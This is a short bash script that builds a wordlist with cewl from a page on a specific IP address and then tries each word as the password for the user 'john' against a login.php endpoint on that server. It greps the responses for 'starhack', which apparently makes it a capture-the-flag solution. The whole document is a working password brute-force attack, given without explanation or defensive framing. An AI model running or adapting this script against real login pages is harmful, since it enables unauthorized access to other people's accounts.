#! /bin/bash
cewl -d0 -m5 -c -w wordlist http://157.159.40.170:8089/articles.php
cut -d',' -f1 wordlist > tmp && cp tmp wordlist && rm tmp
for i in $(cat wordlist); do 
  result="$(curl http://157.159.40.170:8089/login.php --data "username=john&password=$i")"
  echo $result >> tmp
  echo $i >> tmp
done
cat tmp | grep -A1 "starhack"
rm tmp
rm wordlist
